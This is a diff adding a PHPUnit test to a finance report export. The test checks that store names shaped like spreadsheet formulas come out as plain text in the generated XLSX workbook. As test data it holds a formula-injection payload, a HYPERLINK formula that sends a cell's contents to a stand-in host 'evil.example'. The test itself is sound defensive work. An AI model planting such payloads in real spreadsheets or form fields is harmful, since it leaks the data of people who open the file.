@@ -114,4 +114,40 @@ class FinanceReportTest extends TestCase
         $this->assertSame($finance->id, (int) $entry->user_id);
         $this->assertSame('2026-10', $entry->payload_json['period']);
     }
+
+    /**
+     * Review W2: a store's name is the owner's text; one that starts like a formula stays text in the workbook (an
+     * openspout string starting with "=" would be written as a formula, e.g. a HYPERLINK that leaks data on a click).
+     */
+    public function test_a_store_name_that_looks_like_a_formula_is_written_as_text(): void
+    {
+        [$a, $b] = $this->october();
+        $evil = '=HYPERLINK("https://evil.example/?d="&A1,"Ochish")';
+        $b->forceFill(['name' => $evil])->save();
+        $a->forceFill(['name' => '+1-2@x'])->save();
+
+        $response = $this->financeJson('GET', '/finance/reports/monthly/export?period=2026-10', $this->confirmedSession($this->makeMember(PlatformRole::FINANCE)))->assertOk();
+        $path = $response->baseResponse->getFile()->getPathname();
+
+        $zip = new \ZipArchive();
+        $this->assertTrue($zip->open($path));
+        $stores = (string) $zip->getFromName('xl/worksheets/sheet2.xml');
+        $zip->close();
+        $this->assertStringNotContainsString('<f>', $stores);
+        $this->assertStringContainsString('HYPERLINK', $stores);
+
+        $reader = new Reader();
+        $reader->open($path);
+        $names = [];
+        foreach ($reader->getSheetIterator() as $sheet) {
+            if ($sheet->getName() === 'Ovqatxonalar') {
+                foreach ($sheet->getRowIterator() as $row) {
+                    $names[] = $row->toArray()[1];
+                }
+            }
+        }
+        $reader->close();
+        $this->assertContains($evil, $names);
+        $this->assertContains('+1-2@x', $names);
+    }
 }
